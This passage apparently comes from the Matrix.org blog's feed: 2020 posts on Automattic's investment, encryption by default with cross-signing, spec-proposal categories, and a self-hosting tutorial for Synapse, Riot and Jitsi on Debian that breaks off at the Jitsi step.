&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;We’re very excited indeed to announce that &lt;a href=&quot;https:&#x2F;&#x2F;automattic.com&#x2F;&quot;&gt;Automattic&lt;&#x2F;a&gt;, the creators of &lt;a href=&quot;https:&#x2F;&#x2F;wordpress.com&#x2F;&quot;&gt;WordPress.com&lt;&#x2F;a&gt;, are jumping head first into the Matrix ecosystem with a strategic investment of almost $5M into &lt;a href=&quot;https:&#x2F;&#x2F;vector.im&quot;&gt;New Vector&lt;&#x2F;a&gt; (the company which makes &lt;a href=&quot;https:&#x2F;&#x2F;riot.im&quot;&gt;Riot&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;modular.im&quot;&gt;Modular.im&lt;&#x2F;a&gt;, founded by the core Matrix team in 2017).  More importantly, Matt Mullenweg (co-founder of WordPress and founder of Automattic) and the Automattic gang are committing to make the most of Matrix in their work going forwards!&lt;&#x2F;p&gt;
&lt;p&gt;This is huge news, not least because WordPress literally runs over 36% of the websites on today’s web - and the potential of bringing Matrix to all those users is incredible.  Imagine if every WP site automatically came with its own Matrix room or community?  Imagine if all content in WP automatically was published into Matrix as well as the Web?  (This isn’t so far fetched an idea - turns out that Automattic already runs a XMPP bridge for wordpress.com over at &lt;a href=&quot;https:&#x2F;&#x2F;im.wordpress.com&quot;&gt;im.wordpress.com&lt;&#x2F;a&gt;!).  Imagine there was an excellent Matrix client available as a WordPress plugin for embedding realtime chat into your site? Imagine if &lt;a href=&quot;https:&#x2F;&#x2F;tumblr.com&quot;&gt;Tumblr&lt;&#x2F;a&gt; (which is part of Automattic these days) became decentralised!?&lt;&#x2F;p&gt;
&lt;p&gt;In fact, if you’re a developer in either the Matrix or WordPress communities, now might be a good time to think about how to cross the streams.... not least because Automattic just opened up a role for a &lt;a href=&quot;https:&#x2F;&#x2F;automattic.com&#x2F;work-with-us&#x2F;matrix-integrations-engineer&#x2F;&quot;&gt;Matrix.org&#x2F;WordPress Integrations Engineer&lt;&#x2F;a&gt;! Quite aside from the investment, this shows Automattic is serious about Matrix - and we’d like to thank them for opening up jobs in these challenging times to further accelerate Matrix.  Perhaps some day Matrix Engineer will be as common a career choice as Web Developer ;)&lt;&#x2F;p&gt;
&lt;p&gt;That said, it’s super early days for integration work, and there isn’t a concrete project to announce yet beyond the investment in New Vector (which is effectively an extension of the funding NV raised in October) and Automattic’s Job opening - but these are the sort of ideas we’ve been kicking around. And at the very least, we should expect to see Automattic’s communities migrating over to Matrix in the coming months.&lt;&#x2F;p&gt;
&lt;p&gt;It’s been loads of fun working with Matt and the team on this: we see a huge overlap in terms of a genuine love for the open web, open source and open standards.  It’s also no coincidence that Matt (independently of Automattic) donated substantially to Matrix via Patreon back in 2017 when we needed it the most.  We’re also looking forward to benefiting from Automattic’s experience in sustainably and responsibly funding and growing open source projects in general - WordPress.com is an excellent example of how one can support development of a project like WordPress without compromising its open source nature.&lt;&#x2F;p&gt;
&lt;p&gt;So, we’d like to formally welcome WordPress and the rest of the Automattic family into Matrix.  It’s incredibly exciting times, and we can’t wait to see what will come of the partnership!  And meanwhile, if any other massive open source organisations want to join Automattic and &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;12&#x2F;19&#x2F;welcoming-mozilla-to-matrix&quot;&gt;Mozilla&lt;&#x2F;a&gt; in leaping into Matrix, you know where to find us… :D&lt;&#x2F;p&gt;
&lt;p&gt;Huge thanks go to Matt for believing in Matrix - watch this space for updates.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Matthew, Amandine &amp;amp; the Matrix Team.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Cross-signing and End-to-end Encryption by Default is HERE!!!</title>
        <published>2020-05-06T00:00:00+00:00</published>
        <updated>2020-05-06T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2020/05/06/cross-signing-and-end-to-end-encryption-by-default-is-here/" type="text/html"/>
        <id>https://matrix.org/blog/2020/05/06/cross-signing-and-end-to-end-encryption-by-default-is-here/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;As of today, Matrix is end-to-end encrypted &lt;strong&gt;by default&lt;&#x2F;strong&gt; for private conversations.&lt;&#x2F;p&gt;
&lt;p&gt;Three years have passed since we &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2016&#x2F;11&#x2F;21&#x2F;matrixs-olm-end-to-end-encryption-security-assessment-released-and-implemented-cross-platform-on-riot-at-last&quot;&gt;first announced End-to-end Encryption in
Matrix&lt;&#x2F;a&gt;
and started to beta test it in Riot - and after an enormous amount of
polishing and refinement on its user experience, we are finally declaring it
out of beta and enabling it by default for all new private conversations in
Riot.  As Riot is currently the most common Matrix client, this means that
Matrix as a whole should now be considered end-to-end encrypted by default for
DMs and invite-only rooms.&lt;&#x2F;p&gt;
&lt;p&gt;Work on E2EE in Matrix has progressed in waves since we first shipped it - including:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;adding keysharing (letting you share encryption keys between your devices to improve reliability)&lt;&#x2F;li&gt;
&lt;li&gt;making Riot Web&#x27;s encryption resilient to running concurrently in multiple tabs&lt;&#x2F;li&gt;
&lt;li&gt;adding online key backup (so you don&#x27;t lose all your history if you lose all your devices)&lt;&#x2F;li&gt;
&lt;li&gt;making encryption resilient to restoring the app from a backup&lt;&#x2F;li&gt;
&lt;li&gt;adding interactive key verification via emoji to make the verification process easier.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;However, our goal was always to enable E2EE by default for all private rooms,
which means having feature parity between unencrypted and E2EE Matrix so that
we can enable encryption without &lt;em&gt;any&lt;&#x2F;em&gt; negative impact on usability.  The
high-level remaining items were significant:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Cross-signing: verifying your own logins so others don’t have to.&lt;&#x2F;li&gt;
&lt;li&gt;Adding QR codes for even better verification UX, to make cross-signing as painless as possible.&lt;&#x2F;li&gt;
&lt;li&gt;Replacing the old prototype UI for E2EE with final polished UI&#x2F;UX.&lt;&#x2F;li&gt;
&lt;li&gt;Ability to support non-E2EE clients.&lt;&#x2F;li&gt;
&lt;li&gt;Ability to search encrypted rooms.&lt;&#x2F;li&gt;
&lt;li&gt;Ability to view file indexes in encrypted rooms.&lt;&#x2F;li&gt;
&lt;li&gt;Fixing the remaining “Unable to decrypt” errors.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Over the last few months the Riot team has been almost entirely focused on
implementing solutions to these items - and we&#x27;re finally at the point where
the switch can be flipped and as of Riot Web&#x2F;Desktop 1.6, Riot iOS 0.11.1 and
RiotX Android 0.19, all new private rooms will be encrypted by default;
completing the transition we began at &lt;a href=&quot;https:&#x2F;&#x2F;fosdem.org&#x2F;2020&#x2F;schedule&#x2F;event&#x2F;matrix&#x2F;&quot;&gt;FOSDEM
2020&lt;&#x2F;a&gt; when we landed
cross-signing E2E-by-default in the development branches of Riot.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;For full details, please go check out the &lt;a href=&quot;https:&#x2F;&#x2F;blog.riot.im&#x2F;e2e-encryption-by-default-cross-signing-is-here&#x2F;&quot;&gt;massive deep dive over at the Riot
blog&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt; - also featuring all the other recent progress in Riot!&lt;&#x2F;p&gt;
&lt;p&gt;Heads up that encrypted traffic is slightly heavier on the server than
unencrypted (due to exchanging keys, verification traffic, and keybackup
traffic), and so there is a risk that the already-over-popular Matrix.org
server instance may feel a little hugged to death.  However, unprecedented
Synapse performance breakthroughs are on the horizon in the coming weeks which
will fix this - and, of course, you can (and should!) be using your own
instance anyway.&lt;&#x2F;p&gt;
&lt;p&gt;Thanks everyone for helping us test encryption over the years and getting us
to this point: cross-signing provides a more secure way of tracking device
trust than almost any other comms system out there, and we hope that you&#x27;ll
agree the improved UX has been worth the wait.&lt;&#x2F;p&gt;
&lt;p&gt;Next stop: Synapse performance, and rebuilding Riot&#x27;s first time user experience!&lt;&#x2F;p&gt;
&lt;p&gt;thanks,&lt;&#x2F;p&gt;
&lt;p&gt;Matthew, Amandine &amp;amp; the Matrix Team.&lt;&#x2F;p&gt;
&lt;p&gt;(Comments over at &lt;a href=&quot;https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=23107564&quot;&gt;HN&lt;&#x2F;a&gt;)&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>New Categories for Matrix Spec Changes</title>
        <published>2020-04-29T22:37:45+00:00</published>
        <updated>2020-04-29T20:50:24+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2020/04/29/new-categories-for-matrix-spec-changes/" type="text/html"/>
        <id>https://matrix.org/blog/2020/04/29/new-categories-for-matrix-spec-changes/</id>
        
        <content type="html">&lt;p&gt;On April 14th, the Spec Core Team conducted a long-overdue retrospective
about the things that were working in the
&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;spec&#x2F;proposals&quot;&gt;Matrix Spec Proposal process&lt;&#x2F;a&gt;,
and those that were not.&lt;&#x2F;p&gt;
&lt;p&gt;The most glaring item on the list was the sluggish pace that many Matrix
Spec Changes (MSCs) take throughout the proposal process, as well as the
general lack of activity from the Spec Core Team members on proposals that
have not yet started a Final Comment Period.&lt;&#x2F;p&gt;
&lt;p&gt;We deeply apologize for the frustration this has likely caused many MSC
authors, and want to shed some light on the reasoning behind it, and what we
plan to do to prevent leaving authors in the dark about why there may be no
Spec Core Team activity on their proposal.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;proposal-triaging&quot;&gt;Proposal Triaging&lt;&#x2F;h2&gt;
&lt;p&gt;There are currently 136 open MSCs that have yet to undergo Final Comment
Period (FCP), 75 of which are marked as proposal-in-review, and 20 that have
a FCP proposed. Relative to the 65 MSCs that have ever been closed, this is a
lot of outstanding ideas, features and maintenance changes.&lt;&#x2F;p&gt;
&lt;p&gt;The Spec Core Team itself is made up of 8 members, each of which have
separate full-time jobs. All team members are well-placed to be on the team
given their wide breadth of knowledge across the Matrix ecosystem,
however the majority are some of the most busy pushing forward Matrix&#x27;s
reference implementations - without which, Matrix will unquestionably fail.
This limits the amount of MSCs that the team can effectively work on at a
given time.&lt;&#x2F;p&gt;
&lt;p&gt;The team understands that there are MSCs that provide incredibly useful
features, such as
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2191&quot;&gt;support for LaTeX in messages&lt;&#x2F;a&gt;
or
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2403&quot;&gt;the ability to &amp;quot;knock&amp;quot; on rooms&lt;&#x2F;a&gt;,
and would undoubtedly like to see them land at some point.&lt;&#x2F;p&gt;
&lt;p&gt;But there is also a large backlog of MSCs that provide even more fundamental
fixes and additions to the protocol that the team needs to prioritise. These
include things like
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2472&quot;&gt;cross-signing devices&lt;&#x2F;a&gt;,
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1772&quot;&gt;the communities rewrite&lt;&#x2F;a&gt; and
finally merging
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1849&quot;&gt;reactions and edits&lt;&#x2F;a&gt; into the spec.&lt;&#x2F;p&gt;
&lt;p&gt;While we announce what MSCs we&#x27;re focusing on during a given week during
&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;twim&quot;&gt;TWIM&lt;&#x2F;a&gt;, it&#x27;s not as clear which items we&#x27;re looking
to pull from the backlog next. To help tackle this, and to help keep us
honest, we&#x27;ve begun putting each MSC into either &amp;quot;feature&amp;quot;, &amp;quot;maintenance&amp;quot;, or
&amp;quot;core&amp;quot; buckets. This materialises in the form of github tags, which can be
used to filter the list of MSCs like so:
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;issues?q=is%3Aopen+label%3Akind%3Afeature&quot;&gt;feature&lt;&#x2F;a&gt;,
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;issues?q=is%3Aopen+label%3Akind%3Amaintenance&quot;&gt;maintenance&lt;&#x2F;a&gt;,
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;issues?q=is%3Aopen+label%3Akind%3Acore&quot;&gt;core&lt;&#x2F;a&gt;.
For a given timespan, we’ll pick a track and pull MSCs out of that category
when possible. More information about MSC categories are now detailed on
&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;spec&#x2F;proposals#categories&quot;&gt;the proposals page&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;As for the next 6 to 12 months, we plan to work on items from the “core”
category. We need to get Matrix to a point where it can compete with other,
proprietary chat protocols and items in &amp;quot;core&amp;quot; are decidedly the proposals
that will take us the furthest in that direction. This doesn&#x27;t mean we won&#x27;t
occasionally look at an MSC in a different category, but it will heavily
influence our prioritisation.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;future&quot;&gt;Future&lt;&#x2F;h2&gt;
&lt;p&gt;We&#x27;ll try this approach out over the next few months and see how it goes. The
next Spec Core Team retro will occur in the middle of May, where we will
review the process once again.&lt;&#x2F;p&gt;
&lt;p&gt;For now, if you have any feedback please come and chat with us in
&lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#matrix-spec:matrix.org&quot;&gt;#matrix-spec:matrix.org&lt;&#x2F;a&gt; :)&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Running your own secure communication service with Matrix and Jitsi</title>
        <published>2020-04-06T00:00:00+00:00</published>
        <updated>2020-04-06T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2020/04/06/running-your-own-secure-communication-service-with-matrix-and-jitsi/" type="text/html"/>
        <id>https://matrix.org/blog/2020/04/06/running-your-own-secure-communication-service-with-matrix-and-jitsi/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;Over the last few weeks there&#x27;s been huge increase in interest from folks
wanting the security and autonomy of running their remote collaboration
services, rather than being at the mercy of traditional proprietary
centralised apps.  Meanwhile, the Matrix.org homeserver has been very
overloaded (although we&#x27;re at last making excellent progress in radically
improving Synapse&#x27;s performance) - so it&#x27;s particularly important right now to
help folks run their own servers.&lt;&#x2F;p&gt;
&lt;p&gt;Therefore we&#x27;re very happy to announce that it&#x27;s easier than ever before now to
self-host your own video conferencing alongside Riot &amp;amp; Synapse: as of Riot&#x2F;Web
1.5.15 (released last week), it&#x27;s now a single config option to point Riot at
a specific Jitsi rather than needing to hook up to an integration manager!&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, over the last 18 months, it&#x27;s got easier and easier to run your
own Matrix deployments: the Debian packages are unrecognisably better now, and
with &lt;code&gt;.well-known&lt;&#x2F;code&gt; URL support it&#x27;s trivial to set up federation without
needing to worry about complicated DNS, TLS or load balancer configurations.&lt;&#x2F;p&gt;
&lt;p&gt;So, to try to show off just how smooth this has become, we thought we&#x27;d do a
run-through video showing installing Synapse, Riot &amp;amp; Jitsi on a completely
fresh Debian install.  It&#x27;s (almost) filmed in a single shot, and takes about
20 minutes from beginning to end.&lt;&#x2F;p&gt;
&lt;p&gt;Please note that this does assume you&#x27;re pretty familiar with Linux system
administration.  If you&#x27;re not, then we&#x27;d recommend using a Matrix hosting
provider such as &lt;a href=&quot;https:&#x2F;&#x2F;modular.im&quot;&gt;Modular.im&lt;&#x2F;a&gt; (which directly supports development of the core team),
&lt;a href=&quot;https:&#x2F;&#x2F;ungleich.ch&#x2F;u&#x2F;products&#x2F;hosted-matrix-chat&#x2F;&quot;&gt;Ungleich.ch&lt;&#x2F;a&gt;, or &lt;a href=&quot;https:&#x2F;&#x2F;startupstack.tech&#x2F;&quot;&gt;StartupStack&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Finally, while the video shows how to install on Debian via Debian packages,
there are many many other environments and architectures (e.g. installing
under Docker) - this is just one relatively easy way to skin the cat.  Perhaps
there will be other &#x27;speed-run&#x27; videos in future :)&lt;&#x2F;p&gt;
&lt;iframe src=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;dDddKmdLEdg&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;&#x2F;iframe&gt;
&lt;p&gt;If you want to follow along at home without listening to the video (and I can&#x27;t blame you if you do ;) the high level steps are as follows:&lt;&#x2F;p&gt;
&lt;h3 id=&quot;debian-dns&quot;&gt;Debian &amp;amp; DNS&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;Take one fresh Debian 10 install.&lt;&#x2F;li&gt;
&lt;li&gt;Point the DNS for your domain to it.  You should use separate subdomains for the various services as a hygiene measure to make cross-site scripting attacks less effective.  In this example, we set up DNS for:
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;dangerousdemos.net&lt;&#x2F;code&gt; (general website, and for hosting a .well-known path to advertise the Matrix service)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;matrix.dangerousdemos.net&lt;&#x2F;code&gt; (Synapse)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;riot.dangerousdemos.net&lt;&#x2F;code&gt; (Riot&#x2F;Web)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;jitsi.dangerousdemos.net&lt;&#x2F;code&gt; (Jitsi video conferencing)&lt;&#x2F;li&gt;
&lt;li&gt;In practice, we used a &lt;code&gt;*.dangerousdemos.net&lt;&#x2F;code&gt; wildcard DNS record for the three subdomains in this instance.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;nginx-and-letsencrypt&quot;&gt;Nginx and LetsEncrypt&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;Install nginx as a webserver: &lt;code&gt;apt-get update &amp;amp;&amp;amp; apt -y install nginx&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;li&gt;Go to &lt;code&gt;&#x2F;etc&#x2F;nginx&#x2F;sites-enabled&lt;&#x2F;code&gt; and copy the vhost configuration block from the bottom of &lt;code&gt;default&lt;&#x2F;code&gt; to new files called &lt;code&gt;dangerousdemos.net&lt;&#x2F;code&gt;, &lt;code&gt;matrix.dangerousdemos.net&lt;&#x2F;code&gt;, and &lt;code&gt;riot.dangerousdemos.net&lt;&#x2F;code&gt;.  We don&#x27;t set up &lt;code&gt;jitsi.dangerousdemos.net&lt;&#x2F;code&gt; at this point as the jitsi installer handles it for us.
&lt;ul&gt;
&lt;li&gt;Rename the &lt;code&gt;server_name&lt;&#x2F;code&gt; field in the new files to match the hostname of each host, and point &lt;code&gt;root&lt;&#x2F;code&gt; to an appropriate location per domain (e.g. &lt;code&gt;&#x2F;var&#x2F;www&#x2F;dangerousdemos.net&lt;&#x2F;code&gt; for the main domain, or &lt;code&gt;&#x2F;var&#x2F;www&#x2F;riot.dangerousdemos.net&#x2F;riot&lt;&#x2F;code&gt; for riot)&lt;&#x2F;li&gt;
&lt;li&gt;For the Synapse domain (&lt;code&gt;matrix.dangerousdemos.net&lt;&#x2F;code&gt; here), you should replace the contents of the &lt;code&gt;location&lt;&#x2F;code&gt; block with &lt;code&gt;proxy_pass http:&#x2F;&#x2F;localhost:8008;&lt;&#x2F;code&gt; - telling nginx to pass the traffic through to synapse, which listens by default for plaintext HTTP traffic on port 8008.  (N.B. do &lt;strong&gt;not&lt;&#x2F;strong&gt; put a trailing slash on the URL here, otherwise nginx will mangle the forwarded URLs.)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Enable TLS via LetsEncrypt on nginx, by: &lt;code&gt;apt install -y python3-certbot-nginx &amp;amp;&amp;amp; certbot --nginx -d dangerousdemos.net -d riot.dangerousdemos.net -d matrix.dangerousdemos.net&lt;&#x2F;code&gt; (or whatever your domains are).&lt;&#x2F;li&gt;
&lt;li&gt;You should be able to go to https:&#x2F;&#x2F;dangerousdemos.net at this point and see a page with valid HTTPS.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;synapse&quot;&gt;Synapse&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;Then, install Synapse via Debian packages using the instructions at https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;master&#x2F;INSTALL.md#debianubuntu (see below).  If you&#x27;re not on Debian, keep an eye out for all the other OSes we support too!
&lt;ul&gt;
&lt;li&gt;You should specify the server name to be the domain you want in your matrix IDs - i.e. &lt;code&gt;dangerousdemos.net&lt;&#x2F;code&gt; in this example.&lt;&#x2F;li&gt;
&lt;li&gt;Please report anonymous aggregate stats to us so we can gauge uptake and help justify funding for Matrix!&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#1e1e1e;color:#dcdcdc;&quot;&gt;&lt;code&gt;&lt;span&gt;sudo apt install -y lsb-release wget apt-transport-https
&lt;&#x2F;span&gt;&lt;span&gt;sudo wget -O &#x2F;usr&#x2F;share&#x2F;keyrings&#x2F;matrix-org-archive-keyring.gpg https:&#x2F;&#x2F;packages.matrix.org&#x2F;debian&#x2F;matrix-org-archive-keyring.gpg
&lt;&#x2F;span&gt;&lt;span&gt;echo &amp;quot;deb [signed-by=&#x2F;usr&#x2F;share&#x2F;keyrings&#x2F;matrix-org-archive-keyring.gpg] https:&#x2F;&#x2F;packages.matrix.org&#x2F;debian&#x2F; $(lsb_release -cs) main&amp;quot; |
&lt;&#x2F;span&gt;&lt;span&gt;    sudo tee &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;matrix-org.list
&lt;&#x2F;span&gt;&lt;span&gt;sudo apt update
&lt;&#x2F;span&gt;&lt;span&gt;sudo apt install matrix-synapse-py3
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;You should now be able to go to https:&#x2F;&#x2F;matrix.dangerousdemos.net and see a valid &amp;quot;It works! Synapse is running&amp;quot; page.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Then, you should enable registration on your synapse by switching &lt;code&gt;enable_registration: true&lt;&#x2F;code&gt; in &lt;code&gt;&#x2F;etc&#x2F;matrix-synapse&#x2F;homeserver.yaml&lt;&#x2F;code&gt; and restarting synapse via &lt;code&gt;systemctl restart matrix-synapse&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Now you need to tell the rest of Matrix how to find your server.  The easiest way to do this is to publish a file at https:&#x2F;&#x2F;dangerousdemos.net&#x2F;.well-known&#x2F;matrix&#x2F;server which tells everyone the hostname and port where they can find the synapse for dangerousdemos.net - in this instance, it&#x27;s &lt;code&gt;matrix.dangerousdemos.net:443&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#1e1e1e;color:#dcdcdc;&quot;&gt;&lt;code&gt;&lt;span&gt;mkdir -p &#x2F;var&#x2F;www&#x2F;dangerousdemos.net&#x2F;.well-known&#x2F;matrix
&lt;&#x2F;span&gt;&lt;span&gt;cd &#x2F;var&#x2F;www&#x2F;dangerousdemos.net&#x2F;.well-known&#x2F;matrix
&lt;&#x2F;span&gt;&lt;span&gt;echo &amp;#39;{ &amp;quot;m.server&amp;quot;: &amp;quot;matrix.dangerousdemos.net:443&amp;quot; }&amp;#39; &amp;gt; server
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Alternatively&lt;&#x2F;strong&gt;, you could advertise the server via DNS, if you don&#x27;t have write access to &lt;code&gt;&#x2F;.well-known&lt;&#x2F;code&gt; on your main domain.  However, to prove you are allowed to host the Matrix traffic for dangerousdemos.net, you would have to configure nginx to use the dangerousdemos.net TLS certificate for the matrix.dangerousdemos.net vhost (i.e. the &amp;quot;wrong&amp;quot; one), and in general we think that &lt;code&gt;&#x2F;.well-known&lt;&#x2F;code&gt; is much easier to reason about.  In this case you would advertise the server with an SRV record like this:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#1e1e1e;color:#dcdcdc;&quot;&gt;&lt;code&gt;&lt;span&gt;_matrix._tcp.dangerousdemos.net. 300    IN  SRV 10 5 443 matrix.dangerousdemos.net.
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;riot-web&quot;&gt;Riot&#x2F;Web&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;Then, install Riot&#x2F;Web.  Grab the latest .tgz release from https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;releases.  You should check its GnuPG signature too:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#1e1e1e;color:#dcdcdc;&quot;&gt;&lt;code&gt;&lt;span&gt;mkdir &#x2F;var&#x2F;www&#x2F;riot.dangerousdemos.net
&lt;&#x2F;span&gt;&lt;span&gt;cd &#x2F;var&#x2F;www&#x2F;riot.dangerousdemos.net
&lt;&#x2F;span&gt;&lt;span&gt;wget https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;releases&#x2F;download&#x2F;v1.5.15&#x2F;riot-v1.5.15.tar.gz
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;# check its GnuPG signature (particularly advisable, given Riot is what stores
&lt;&#x2F;span&gt;&lt;span&gt;# your end-to-end encryption keys)
&lt;&#x2F;span&gt;&lt;span&gt;apt install -y gnupg
&lt;&#x2F;span&gt;&lt;span&gt;wget https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;releases&#x2F;download&#x2F;v1.5.15&#x2F;riot-v1.5.15.tar.gz.asc
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;# grab the signing key for the riot releases repository, ideally from a keyserver...
&lt;&#x2F;span&gt;&lt;span&gt;gpg --keyserver keyserver.ubuntu.com --search-keys releases@riot.im
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;# ...and&#x2F;or you can grab or cross-check the signing key from packages.riot.im
&lt;&#x2F;span&gt;&lt;span&gt;wget https:&#x2F;&#x2F;packages.riot.im&#x2F;riot-release-key.asc
&lt;&#x2F;span&gt;&lt;span&gt;gpg --import riot-release-key.asc
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;gpg --verify riot-v1.5.15.tar.gz.asc
&lt;&#x2F;span&gt;&lt;span&gt;# hopefully this will report &amp;quot;Good signature&amp;quot;, even though it won&amp;#39;t know to trust the riot release key.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;# you could also choose to explicitly trust the key by editing it, entering &amp;#39;trust&amp;#39; and then &amp;#39;5&amp;#39; for ultimate trust.
&lt;&#x2F;span&gt;&lt;span&gt;gpg --edit-key 74692659bda3d940
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;tar -xzvf riot-v1.5.15.tar.gz
&lt;&#x2F;span&gt;&lt;span&gt;ln -s riot-v1.5.15 riot
&lt;&#x2F;span&gt;&lt;span&gt;chown www-data:www-data -R riot
&lt;&#x2F;span&gt;&lt;span&gt;cd riot
&lt;&#x2F;span&gt;&lt;span&gt;cp config.sample.json config.json
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;You then tweak the &lt;code&gt;config.json&lt;&#x2F;code&gt; to change the &lt;code&gt;base_url&lt;&#x2F;code&gt; of the homeserver to be &lt;code&gt;https:&#x2F;&#x2F;matrix.dangerousdemos.net&lt;&#x2F;code&gt; (i.e. where to find the Client Server API for your server), and change the &lt;code&gt;server_name&lt;&#x2F;code&gt; to be &lt;code&gt;dangerousdemos.net&lt;&#x2F;code&gt; (i.e. the name of your server).&lt;&#x2F;li&gt;
&lt;li&gt;You should then be able to go to https:&#x2F;&#x2F;riot.dangerousdemos.net, register for an account, sign in, and talk to the rest of Matrix!&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;jitsi&quot;&gt;Jitsi&lt;&#x2F;h3&gt;
&lt;ul&gt;
